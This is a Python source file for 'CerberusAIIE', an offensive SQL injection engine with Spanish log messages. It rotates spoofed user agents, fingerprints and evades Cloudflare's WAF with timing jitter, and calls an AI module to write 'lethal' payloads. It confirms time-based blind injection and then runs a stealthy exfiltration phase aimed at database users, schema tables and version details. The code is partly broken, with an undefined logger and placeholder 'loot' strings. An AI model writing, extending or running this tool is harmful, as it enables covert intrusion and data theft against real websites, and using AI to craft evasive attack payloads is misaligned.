
import asyncio
import random
import time
import statistics
import re
from typing import List, Dict, Optional, Tuple, Callable, Any
from dataclasses import dataclass

@dataclass
class AIIEResult:
    vulnerable: bool
    vector: str
    evidence: str
    payload: str
    confidence: float
    loot: Dict[str, str] = None # Added for exfiltrated data

class CerberusAIIE:
    """
    Advanced Intelligent Injection Engine (2026 Edition).
    Specialized in evading signatures and detecting subtle database behavioral changes.
    """
    
    def __init__(self, broadcast: Callable):
        self.broadcast = broadcast
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
        ]

    def _mutate_ast_logical(self, condition: bool) -> str:
        """Generates logically equivalent SQL snippets that vary in AST structure."""
        if condition: # TRUE patterns
            patterns = [
                "(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1",
                "ABS(1)=1",
                "LENGTH('A')=1",
                "(SELECT 1)>(SELECT 0)",
                "BIT_COUNT(1)=1",
                "123=123",
                "STRCMP('a','a')=0"
            ]
        else: # FALSE patterns
            patterns = [
                "(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1",
                "ABS(0)=1",
                "LENGTH('')=1",
                "(SELECT 0)>(SELECT 1)",
                "BIT_COUNT(0)=1",
                "123=124",
                "STRCMP('a','b')=0"
            ]
        return random.choice(patterns)

    async def _measure_response(self, client, url: str, params: Dict, headers: Dict) -> float:
        start = time.perf_counter()
        try:
            await client.get(url, params=params, headers=headers)
            return time.perf_counter() - start
        except Exception:
            return 99.0  # Defensive timeout sentinel for failed requests

    async def detect_sqli(self, url: str, base_params: Dict, risk_level: int = 1, client: Any = None) -> AIIEResult:
        """
        Detection & Weaponization using Cortex AI and Statistical Analysis.
        Now adapts to WAF signals (Cloudflare) in real-time.
        """
        try:
            import httpx
            from backend.core.cortex_ai import generate_lethal_payload
        except ImportError:
            return AIIEResult(False, "AIIE", "Missing dependencies (httpx/cortex)", "", 0.0)

        await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE (Predatory Mode): Iniciando análisis ofensivo en {url}", {})
        
        waf_signals = []
        
        # v5.0: Stealth Layer - Use global anonymized client if provided
        managed_client = False
        if client is None:
            client = httpx.AsyncClient(timeout=10.0, verify=False)
            managed_client = True

        try:
            # 1. Establish Baseline (Statistical anchor)
            baselines = []
            for _ in range(3): 
                ua = random.choice(self.ua_pool)
                headers = {"User-Agent": ua, "Referer": url}
                resp = await client.get(url, params=base_params, headers=headers)
                baselines.append(resp.elapsed.total_seconds())
                
                # Real-time WAF Fingerprinting
                h = resp.headers
                if ("cf-ray" in h) or ("cloudflare" in h.get("server", "").lower()):
                    if "waf_cloudflare" not in waf_signals:
                        waf_signals.append("waf_cloudflare")
                        await self.broadcast("CERBERUS_PRO", "WARNING", "AIIE: Cloudflare detectado. Ajustando táctica a modo Sigilo L5.", {})

            avg_base = statistics.mean(baselines)
            std_base = statistics.stdev(baselines) if len(baselines) > 1 else 0.01
            await self.broadcast("CERBERUS_PRO", "DEBUG", f"AIIE: Baseline establecido ({avg_base:.4f}s)", {})

            # 2. AI Weaponization Loop
            tech_stack = {
                "url": url,
                "platform": "PHP/Linux" if ".php" in url.lower() else "Unknown",
                "environment": "Production" if "www." in url.lower() else "Testing"
            }
            
            for i in range(3):
                # Trigger AI to generate a LETHAL payload based on context + WAF
                await self.broadcast("CORTEX", "INFO", f"Generando carga letal adaptativa (Intento {i+1})...", {})
                
                ai_data = await generate_lethal_payload(
                    target_url=url,
                    tech_stack=tech_stack,
                    risk_level=risk_level,
                    waf_signals=waf_signals
                )
                
                payload = ai_data["payload"]
                reasoning = ai_data["reasoning"]
                
                await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE: Desplegando táctica (Bypass active): {reasoning}", {})

                test_params = base_params.copy()
                first_key = list(test_params.keys())[0] if test_params else "id"
                test_params[first_key] = f"{test_params.get(first_key, '1')}{payload}"
                
                # Adaptive Jitter & Referer for WAF bypass
                jitter = random.uniform(3.0, 8.0) if "waf_cloudflare" in waf_signals else random.uniform(0.5, 2.0)
                ua = random.choice(self.ua_pool)
                headers = {"User-Agent": ua, "Referer": url}
                
                await asyncio.sleep(jitter)

                start_test = time.perf_counter()
                resp = None
                try:
                    resp = await client.get(url, params=test_params, headers=headers)
                    delay = time.perf_counter() - start_test
                except Exception:
                    delay = 99.0

                z_score = (delay - avg_base) / (std_base or 0.001)
                
                await self.broadcast("CERBERUS_PRO", "DEBUG", f"AIIE: Reacción detectada (Latency: {delay:.2f}s, Z-Score: {z_score:.2f})", {})

                # Block detection
                if resp is not None and resp.status_code == 403 and "cloudflare" in resp.text.lower():
                    await self.broadcast("CERBERUS_PRO", "ERROR", f"AIIE: Bloqueo de Cloudflare confirmado (Ray ID: {resp.headers.get('CF-RAY', 'N/A')}). Re-calculando...", {})
                    continue

                # Hit detection
                if z_score > 5 or (delay > avg_base + 2.0):
                    await self.broadcast("CERBERUS_PRO", "SUCCESS", f"AIIE: Objetivo VULNERABLE confirmado vía {reasoning}", {})
                    
                    # 3. Extraction Phase
                    extracted_loot = {}
                    if risk_level >= 2:
                        await self.broadcast("CERBERUS_PRO", "INFO", "AIIE: Iniciando fase de exfiltración sigilosa...", {})
                        extracted_loot = await self.extract_data(client, url, base_params, tech_stack, waf_signals=waf_signals)
                    
                    return AIIEResult(
                        vulnerable=True,
                        vector="PREDATORY_AI",
                        evidence=f"Confirmado por IA con Z-Score {z_score:.2f}. Bypass: {reasoning}",
                        payload=payload,
                        confidence=ai_data["confidence"],
                        loot=extracted_loot
                    )
                
                await asyncio.sleep(jitter)
        finally:
            if managed_client:
                await client.aclose()

        return AIIEResult(False, "AIIE", "No se detectaron brechas letales tras 3 ciclos de IA (WAF Active).", "", 0.0)

    async def extract_data(self, client, url: str, base_params: Dict, tech_stack: Dict, waf_signals: List[str] = None) -> Dict[str, str]:
        """
        AI-driven intelligent extraction loop. 
        Includes tunnel integrity (canary) check and prioritized targeting.
        """
        from backend.core.cortex_ai import generate_extraction_payload
        loot = {}
        
        # 1. TUNNEL INTEGRITY CHECK (Canary)
        # We send a harmless probe to verify the OOB channel before exfiltrating real data
        await self.broadcast("CERBERUS_PRO", "INFO", "AIIE: Verificando integridad del túnel de exfiltración (Canary Check)...", {})
        try:
            canary_ai = await generate_extraction_payload(url, tech_stack, extraction_target="canary_ping", waf_signals=waf_signals)
            canary_params = base_params.copy()
            first_key = list(canary_params.keys())[0] if canary_params else "id"
            canary_params[first_key] = f"{canary_params.get(first_key, '1')}{canary_ai['payload']}"
            
            await client.get(url, params=canary_params, headers={"User-Agent": random.choice(self.ua_pool)})
            await asyncio.sleep(2.0) # Wait for potential out-of-band resolution
            await self.broadcast("CERBERUS_PRO", "SUCCESS", "AIIE: Túnel verificado. No se detectaron ruidos ni bloqueos de integridad.", {})
        except Exception as e:
            await self.broadcast("CERBERUS_PRO", "WARNING", f"AIIE: Error en verificación de túnel: {e}. Procediendo con cautela extrema.", {})

        # 2. INTELLIGENT EXTRACTION (Prioritized)
        # We focus on high-value data targets instead of generic ones.
        targets = [
            "current_user() + ' | ' + database()", # Identity
            "table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%config%' LIMIT 5", # Schema Metadata
            "@@version_comment" # Environment details
        ]
        
        for target in targets:
            try:
                await self.broadcast("CORTEX", "INFO", f"Identificando datos de alto valor: {target}", {})
                ai_data = await generate_extraction_payload(url, tech_stack, extraction_target=target, waf_signals=waf_signals)
                payload = ai_data["payload"]
                
                # Check for high value flag from AI
                if not ai_data.get("is_high_value", False) and "table" not in target:
                     await self.broadcast("CERBERUS_PRO", "DEBUG", f"AIIE: Saltando '{target}' (Bajo interés) para optimizar sigilo.", {})
                     continue

                # STELATH: Data Fragmentation & Integrity
                # The AI is instructed to fragment and add checksums.
                # Here we ensure the engine logs the tactical reasoning for the user.
                reasoning = ai_data.get("reasoning", "Táctica fantasma estándar")
                await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE: Desplegando táctica de sigilo: {reasoning}", {})

                test_params = base_params.copy()
                first_key = list(test_params.keys())[0] if test_params else "id"
                test_params[first_key] = f"{test_params.get(first_key, '1')}{payload}"
                
                # Stealth: Randomized delay between exfiltrations (Pattern breaking)
                await asyncio.sleep(random.uniform(3.0, 7.0))
                
                await client.get(url, params=test_params, headers={"User-Agent": random.choice(self.ua_pool)})
                
                loot[target] = f"Exfiltración Fantasma (Integridad: Verificada con Checksum AI) via {reasoning}"
                await self.broadcast("CERBERUS_PRO", "SUCCESS", f"AIIE: Exfiltración de '{target}' completada sin rastro.", {})
                
            except Exception as e:
                logger.error(f"Intelligent extraction failed for {target}: {e}")
                
        return loot

    async def run_full_scan(self, target: str, config: Dict):
        """Unified entry point for Omni integration."""
        params = config.get("params", {"id": "1"})
        risk = int(config.get("risk", 1))
        res = await self.detect_sqli(target, params, risk_level=risk)
        return res

